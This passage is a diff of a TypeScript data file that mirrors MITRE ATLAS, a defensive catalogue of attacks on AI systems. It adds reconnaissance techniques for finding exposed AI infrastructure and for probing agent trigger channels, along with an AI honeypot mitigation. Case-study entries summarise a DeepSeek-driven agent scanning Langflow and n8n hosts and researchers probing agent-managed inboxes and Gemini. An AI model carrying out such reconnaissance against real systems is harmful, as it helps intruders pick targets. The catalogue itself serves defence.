@@ -5,19 +5,19 @@
  * Authoritative Source: https://github.com/mitre-atlas/atlas-data (dist/v6/ATLAS-latest.yaml)
  * 100% 1-to-1 Parity with https://atlas.mitre.org/
  * 
- * Last synchronized: 2026-09-14T09:22:03.314Z
+ * Last synchronized: 2026-09-21T09:24:31.240Z
  */
 
 import { MitreAtlasTactic, MitreAtlasTechnique, MitreAtlasOverview } from '../types';
 
 export const MITRE_ATLAS_META = {
-  "version": "2026.08",
-  "lastUpdated": "2026-05-27",
+  "version": "2026.09",
+  "lastUpdated": "2026-09-15",
   "totalTactics": 16,
-  "totalTechniques": 197,
-  "totalSubtechniques": 83,
-  "totalProcedureExamples": 659,
-  "totalMitigations": 39
+  "totalTechniques": 208,
+  "totalSubtechniques": 88,
+  "totalProcedureExamples": 665,
+  "totalMitigations": 40
 } as const;
 
 export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
@@ -31,7 +31,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0000",
         "name": "Search Open Technical Databases",
-        "description": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization.\nThe adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective.\nOrganizations often use open source model architectures trained on additional proprietary data in production.\nKnowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)).\nAn adversary can search these resources for publications by authors employed at the victim organization.\n\nResearch and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).",
+        "description": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization. The adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective. Organizations often use open source model architectures trained on additional proprietary data in production. Knowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)). An adversary can search these resources for publications for authors employed at the victim organization.\n\nResearch and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000) or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002). Publicly accessible AI services may be identified via [Scan Databases](/techniques/AML.T0000.003).",
         "tacticId": "AML.TA0002",
         "tacticName": "Reconnaissance",
         "tactics": [
@@ -59,6 +59,12 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "name": "Technical Blogs",
             "description": "Research labs at academic institutions and company R&D divisions often have blogs that highlight their use of artificial intelligence and its application to the organization's unique problems.\nIndividual researchers also frequently document their work in blog posts.\nAn adversary may search for posts made by the target victim organization or its employees.\nIn comparison to [Journals and Conference Proceedings](/techniques/AML.T0000.000) and [Pre-Print Repositories](/techniques/AML.T0000.001) this material will often contain more practical aspects of the AI system.\nThis could include underlying technologies and frameworks used, and possibly some information about the API access and use case.\nThis will help the adversary better understand how that organization is using AI internally and the details of their approach that could aid in tailoring an attack.",
             "url": "https://atlas.mitre.org/techniques/AML.T0000.002"
+          },
+          {
+            "id": "AML.T0000.003",
+            "name": "Scan Databases",
+            "description": "Adversaries may search public internet-scan services to identify a victim's exposed AI infrastructure. These services, such as Shodan and Censys, continuously scan the internet and publish the active IP addresses, hostnames, open ports, and service banners, which adversaries can query without interacting with the target directly. \n\nInformation gathered this way may also reveal candidates for follow-on [Active Scanning](/techniques/AML.T0006) to confirm that services remain reachable, to probe for misconfigurations or unauthorized endpoints. It may also inform later initial access attempts such as [Exploit Public-Facing Application](/techniques/AML.T0049). Unlike [Active Scanning](/techniques/AML.T0006), this technique relies on third-party scan data and involves no direct interaction with the victim system.",
+            "url": "https://atlas.mitre.org/techniques/AML.T0000.003"
           }
         ],
         "url": "https://atlas.mitre.org/techniques/AML.T0000",
@@ -71,7 +77,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "url": "https://attack.mitre.org/techniques/T1596/"
         },
         "createdDate": "2021-05-13",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0000",
@@ -79,6 +85,13 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.",
             "useDescription": "Limit the connection between publicly disclosed approaches and the data, models, and algorithms used in production.",
             "url": "https://atlas.mitre.org/mitigations/AML.M0000"
+          },
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Decoy assets are catalogued by the same internet scan databases (e.g., Shodan, Censys) that adversaries query to locate exposed AI infrastructure. Adversarial engagement that originates from those platforms can grant defenders visibility into those discovery channels.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
           }
         ],
         "caseStudies": [
@@ -116,11 +129,6 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0012",
             "name": "Face Identification System Evasion via Physical Countermeasures",
             "url": "https://atlas.mitre.org/studies/AML.CS0012"
-          },
-          {
-            "id": "AML.CS0048",
-            "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-            "url": "https://atlas.mitre.org/studies/AML.CS0048"
           },
           {
             "id": "AML.CS0070",
@@ -186,27 +194,11 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "tacticId": "AML.TA0002"
           },
           {
-            "caseStudyId": "AML.CS0048",
-            "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-            "description": "The researcher performed targeting by searching for the title tag of ClawdBot's web-based control interface, \"Clawdbot Control\" on Shodan, identifying hundreds of ClawdBot control interfaces exposed on the public internet.",
-            "url": "https://atlas.mitre.org/studies/AML.CS0048",
-            "stepId": "S00",
-            "tacticId": "AML.TA0002"
-          },
-          {
-            "caseStudyId": "AML.CS0070",
-            "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
-            "description": "DeepSeek queried FOFA and obtained records for 84 exposed Langflow instances. These were exposure records, not confirmed vulnerable targets.",
-            "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S09",
-            "tacticId": "AML.TA0002"
-          },
-          {
             "caseStudyId": "AML.CS0070",
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek queried FOFA for n8n deployments. FOFA reported 647,017 global results and 25,209 in China; these were not confirmed vulnerable systems.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S16",
+            "stepId": "S15",
             "tacticId": "AML.TA0002"
           }
         ],
@@ -314,6 +306,73 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         "mitigations": [],
         "caseStudies": [],
         "procedureExamples": [],
+        "references": []
+      },
+      {
+        "id": "AML.T0000.003",
+        "name": "Scan Databases",
+        "description": "Adversaries may search public internet-scan services to identify a victim's exposed AI infrastructure. These services, such as Shodan and Censys, continuously scan the internet and publish the active IP addresses, hostnames, open ports, and service banners, which adversaries can query without interacting with the target directly. \n\nInformation gathered this way may also reveal candidates for follow-on [Active Scanning](/techniques/AML.T0006) to confirm that services remain reachable, to probe for misconfigurations or unauthorized endpoints. It may also inform later initial access attempts such as [Exploit Public-Facing Application](/techniques/AML.T0049). Unlike [Active Scanning](/techniques/AML.T0006), this technique relies on third-party scan data and involves no direct interaction with the victim system.",
+        "tacticId": "AML.TA0002",
+        "tacticName": "Reconnaissance",
+        "tactics": [
+          {
+            "id": "AML.TA0002",
+            "name": "Reconnaissance"
+          }
+        ],
+        "isSubtechnique": true,
+        "parentTechniqueId": "AML.T0000",
+        "parentTechniqueName": "Search Open Technical Databases",
+        "url": "https://atlas.mitre.org/techniques/AML.T0000.003",
+        "platforms": [
+          "Enterprise"
+        ],
+        "maturity": "Realized",
+        "attackReference": {
+          "id": "T1596.005",
+          "url": "https://attack.mitre.org/techniques/T1596/005/"
+        },
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Decoy assets are catalogued by the same internet scan databases (e.g., Shodan, Censys) that adversaries query to locate exposed AI infrastructure. Adversarial engagement that originates from those platforms can grant defenders visibility into those discovery channels.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [
+          {
+            "id": "AML.CS0048",
+            "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+            "url": "https://atlas.mitre.org/studies/AML.CS0048"
+          },
+          {
+            "id": "AML.CS0070",
+            "name": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
+            "url": "https://atlas.mitre.org/studies/AML.CS0070"
+          }
+        ],
+        "procedureExamples": [
+          {
+            "caseStudyId": "AML.CS0048",
+            "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+            "description": "The researcher performed targeting by searching for the title tag of ClawdBot's web-based control interface, \"Clawdbot Control\" on Shodan, identifying hundreds of ClawdBot control interfaces exposed on the public internet.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0048",
+            "stepId": "S00",
+            "tacticId": "AML.TA0002"
+          },
+          {
+            "caseStudyId": "AML.CS0070",
+            "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
+            "description": "DeepSeek queried FOFA and obtained records for 84 exposed Langflow instances. These were exposure records, not confirmed vulnerable targets.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0070",
+            "stepId": "S08",
+            "tacticId": "AML.TA0002"
+          }
+        ],
         "references": []
       },
       {
@@ -519,7 +578,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0006",
         "name": "Active Scanning",
-        "description": "An adversary may probe or scan the victim system to gather information for targeting. This is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.\n\nAdversaries may scan for open ports on a potential victim's network, which can indicate specific services or tools the victim is utilizing. This could include a scan for tools related to AI DevOps or AI services themselves such as public AI chat agents (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)). They can also send emails to organization service addresses and inspect the replies for indicators that an AI agent is managing the inbox.\n\nInformation gained from Active Scanning may yield targets that provide opportunities for other forms of reconnaissance such as [Search Open Technical Databases](/techniques/AML.T0000), [Search Open AI Vulnerability Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed Targets](/techniques/AML.T0064).",
+        "description": "Adversaries may actively scan for publicly reachable AI systems and resources for targeting. They may identify resources or systems that are misconfigured or are known vulnerable versions. This is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.\n\nSince AI systems are often deployed in cloud environments, adversaries can use various enumeration methods to effectively discover AI systems and uncover information about their supporting underlying platforms. For agentic and SaaS-hosted systems, the victim system can include the shared platform and provider control plane on which the victim's agents are deployed.\n\nAdversaries may probe the victim system to gather information and metadata for targeting, or actively scan for specific open ports on a potential victim's network or accessible deployed servers, with the goal of locating different types of deployed AI services. These methods could also include directly scanning a target's assets for publicly available AI agents, or for accessible agentic chat interfaces on SaaS platforms (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)).\n\nInformation gained from Active Scanning may yield targets that provide opportunities for other forms of reconnaissance such as [Search Open Technical Databases](/techniques/AML.T0000), [Search Open Websites/Domains](/techniques/AML.T0095), [Search Open AI Vulnerability Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed Targets](/techniques/AML.T0064).",
         "tacticId": "AML.TA0002",
         "tacticName": "Reconnaissance",
         "tactics": [
@@ -529,6 +588,32 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           }
         ],
         "isSubtechnique": false,
+        "subtechniques": [
+          {
+            "id": "AML.T0006.000",
+            "name": "Enumerate Hosted AI Resources",
+            "description": "Adversaries may directly probe an agentic or SaaS platform to enumerate the resources a specific victim has deployed on it. Platforms frequently host AI agents behind predictable URL structures derived from identifiers such as environment, tenant, resource-group, or agent names, and default out-of-the-box deployment configurations keep these conventions consistent across victims. Adversaries can learn these conventions from public sources such as vendor documentation, code repositories and actual hosted resources, then fuzz or brute-force the derived namespace to discover live AI agents, endpoints, and associated metadata. Discovered resources can be used to identify targets for further access, collection, or attack adaptation.",
+            "url": "https://atlas.mitre.org/techniques/AML.T0006.000"
+          },
+          {
+            "id": "AML.T0006.001",
+            "name": "Query Platform Metadata APIs",
+            "description": "Adversaries may query documented or undocumented APIs in agentic SaaS hosting platforms to uncover agentic targets. SaaS and agentic platforms can expose provider control-plane or identity APIs that return tenant, environment, or deployment information IDs, including for resources that are misconfigured or unintentionally accessible by unauthenticated users. \n\nAttackers have been seen abusing this type of functionality to perform information gathering on SaaS platforms, for example via AADInternals' OSINT page,[[aadinternals]] an OSINT online tool showcasing an undocumented API reconnaissance method for Entra ID. This undocumented Power Platform API could be used to uncover environment IDs, which may subsequently be used to scan for public agents. Following the identified abuse, required authentication was added to the tool.",
+            "url": "https://atlas.mitre.org/techniques/AML.T0006.001"
+          },
+          {
+            "id": "AML.T0006.002",
+            "name": "Scan for Exposed AI Infrastructure",
+            "description": "Adversaries may scan network ports and services to identify deployed AI backends, model-serving endpoints, and AI agent infrastructure reachable over the internet. Self-hosted AI runtimes typically listen on predictable, well-known ports and expose standard API paths, allowing adversaries to efficiently locate candidate hosts and infer the platform running on them. \n\nAfter identifying candidate hosts, adversaries can interact with them directly to confirm live AI services, fingerprint the software stack, and determine version and configuration details. This information can be used to select exploitable targets and tailor subsequent access attempts.",
+            "url": "https://atlas.mitre.org/techniques/AML.T0006.002"
+          },
+          {
+            "id": "AML.T0006.003",
+            "name": "Probe AI Agent Trigger Channels",
+            "description": "Adversaries may send crafted inputs to potential public triggers, such as email addresses, webhooks, or messaging channels, to elicit a response that indicates an invocation of agentic activity. The nature of the response and its content can often reveal agent-managed accounts and expose the additional agentic attack surface. Identified triggers can be used to directly attack the agent.",
+            "url": "https://atlas.mitre.org/techniques/AML.T0006.003"
+          }
+        ],
         "url": "https://atlas.mitre.org/techniques/AML.T0006",
         "platforms": [
           "Predictive AI",
@@ -542,7 +627,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "url": "https://attack.mitre.org/techniques/T1595/"
         },
         "createdDate": "2021-05-13",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0019",
@@ -557,6 +642,13 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "Define enforceable security boundaries around AI agent tools, data sources, identities, and execution environments. Mediate access through authenticated APIs, isolate code execution via containers or virtual machines, restrict filesystem and network access, and limit tool invocation rates. Build execution environments from clean base images for each run, and do not carry forward any operational state. These controls limit the ability of untrusted processes or compromised components to affect the broader system.\n\nWhen AI agents share infrastructure, isolate each agent's identity, credentials, state, storage, messaging, tools, and network access in order to prevent undesired agent-to-agent communication channels or coordination. Run the highest-risk workloads in network-isolated or air-gapped environments.",
             "useDescription": "Segment AI agent components so an exposed service does not reveal or provide reachability to additional internal components.",
             "url": "https://atlas.mitre.org/mitigations/AML.M0032"
+          },
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
           }
         ],
         "caseStudies": [
@@ -564,11 +656,6 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0023",
             "name": "ShadowRay: Hijacking Exposed Ray Clusters",
             "url": "https://atlas.mitre.org/studies/AML.CS0023"
-          },
-          {
-            "id": "AML.CS0037",
-            "name": "Data Exfiltration via Agent Tools in Copilot Studio",
-            "url": "https://atlas.mitre.org/studies/AML.CS0037"
           },
           {
             "id": "AML.CS0063",
@@ -601,14 +688,6 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "tacticId": "AML.TA0002"
           },
           {
-            "caseStudyId": "AML.CS0037",
-            "caseStudyName": "Data Exfiltration via Agent Tools in Copilot Studio",
-            "description": "The researchers look for support email addresses on the target organization's website which may be managed by an AI agent. Then, they probe the system by sending emails and looking for indications of agentic AI in automatic replies.",
-            "url": "https://atlas.mitre.org/studies/AML.CS0037",
-            "stepId": "S00",
-            "tacticId": "AML.TA0002"
-          },
-          {
             "caseStudyId": "AML.CS0063",
             "caseStudyName": "Prompt-Based Attacks Against Gemini via Calendar Invitations",
             "description": "The researchers directly probed Gemini interfaces to understand its agent selection and execution behavior.",
@@ -629,7 +708,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek ran the public Langflow scanner and identified a target running Langflow 1.3.4.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S11",
+            "stepId": "S10",
             "tacticId": "AML.TA0002"
           },
           {
@@ -637,7 +716,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek sampled approximately 100 Chinese addresses, probed roughly 40 unique systems, identified three running affected versions, inspected form endpoints, and launched parallel scanning against more than 50 remaining targets.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S17",
+            "stepId": "S16",
             "tacticId": "AML.TA0002"
           },
           {
@@ -646,6 +725,179 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "The framework probed primary government applications and APIs for exposed interfaces, authentication behavior, misconfigurations, and vulnerabilities. This scanning identified multiple potential paths into the targeted systems.",
             "url": "https://atlas.mitre.org/studies/AML.CS0071",
             "stepId": "S05",
+            "tacticId": "AML.TA0002"
+          }
+        ],
+        "references": []
+      },
+      {
+        "id": "AML.T0006.000",
+        "name": "Enumerate Hosted AI Resources",
+        "description": "Adversaries may directly probe an agentic or SaaS platform to enumerate the resources a specific victim has deployed on it. Platforms frequently host AI agents behind predictable URL structures derived from identifiers such as environment, tenant, resource-group, or agent names, and default out-of-the-box deployment configurations keep these conventions consistent across victims. Adversaries can learn these conventions from public sources such as vendor documentation, code repositories and actual hosted resources, then fuzz or brute-force the derived namespace to discover live AI agents, endpoints, and associated metadata. Discovered resources can be used to identify targets for further access, collection, or attack adaptation.",
+        "tacticId": "AML.TA0002",
+        "tacticName": "Reconnaissance",
+        "tactics": [
+          {
+            "id": "AML.TA0002",
+            "name": "Reconnaissance"
+          }
+        ],
+        "isSubtechnique": true,
+        "parentTechniqueId": "AML.T0006",
+        "parentTechniqueName": "Active Scanning",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.000",
+        "platforms": [
+          "Predictive AI",
+          "Generative AI",
+          "Agentic AI",
+          "Enterprise"
+        ],
+        "maturity": "Feasible",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [],
+        "procedureExamples": [],
+        "references": []
+      },
+      {
+        "id": "AML.T0006.001",
+        "name": "Query Platform Metadata APIs",
+        "description": "Adversaries may query documented or undocumented APIs in agentic SaaS hosting platforms to uncover agentic targets. SaaS and agentic platforms can expose provider control-plane or identity APIs that return tenant, environment, or deployment information IDs, including for resources that are misconfigured or unintentionally accessible by unauthenticated users. \n\nAttackers have been seen abusing this type of functionality to perform information gathering on SaaS platforms, for example via AADInternals' OSINT page,[[aadinternals]] an OSINT online tool showcasing an undocumented API reconnaissance method for Entra ID. This undocumented Power Platform API could be used to uncover environment IDs, which may subsequently be used to scan for public agents. Following the identified abuse, required authentication was added to the tool.",
+        "tacticId": "AML.TA0002",
+        "tacticName": "Reconnaissance",
+        "tactics": [
+          {
+            "id": "AML.TA0002",
+            "name": "Reconnaissance"
+          }
+        ],
+        "isSubtechnique": true,
+        "parentTechniqueId": "AML.T0006",
+        "parentTechniqueName": "Active Scanning",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.001",
+        "platforms": [
+          "Predictive AI",
+          "Generative AI",
+          "Agentic AI",
+          "Enterprise"
+        ],
+        "maturity": "Feasible",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [],
+        "procedureExamples": [],
+        "references": []
+      },
+      {
+        "id": "AML.T0006.002",
+        "name": "Scan for Exposed AI Infrastructure",
+        "description": "Adversaries may scan network ports and services to identify deployed AI backends, model-serving endpoints, and AI agent infrastructure reachable over the internet. Self-hosted AI runtimes typically listen on predictable, well-known ports and expose standard API paths, allowing adversaries to efficiently locate candidate hosts and infer the platform running on them. \n\nAfter identifying candidate hosts, adversaries can interact with them directly to confirm live AI services, fingerprint the software stack, and determine version and configuration details. This information can be used to select exploitable targets and tailor subsequent access attempts.",
+        "tacticId": "AML.TA0002",
+        "tacticName": "Reconnaissance",
+        "tactics": [
+          {
+            "id": "AML.TA0002",
+            "name": "Reconnaissance"
+          }
+        ],
+        "isSubtechnique": true,
+        "parentTechniqueId": "AML.T0006",
+        "parentTechniqueName": "Active Scanning",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.002",
+        "platforms": [
+          "Predictive AI",
+          "Generative AI",
+          "Agentic AI",
+          "Enterprise"
+        ],
+        "maturity": "Feasible",
+        "attackReference": {
+          "id": "T1595",
+          "url": "https://attack.mitre.org/techniques/T1595/"
+        },
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [],
+        "procedureExamples": [],
+        "references": []
+      },
+      {
+        "id": "AML.T0006.003",
+        "name": "Probe AI Agent Trigger Channels",
+        "description": "Adversaries may send crafted inputs to potential public triggers, such as email addresses, webhooks, or messaging channels, to elicit a response that indicates an invocation of agentic activity. The nature of the response and its content can often reveal agent-managed accounts and expose the additional agentic attack surface. Identified triggers can be used to directly attack the agent.",
+        "tacticId": "AML.TA0002",
+        "tacticName": "Reconnaissance",
+        "tactics": [
+          {
+            "id": "AML.TA0002",
+            "name": "Reconnaissance"
+          }
+        ],
+        "isSubtechnique": true,
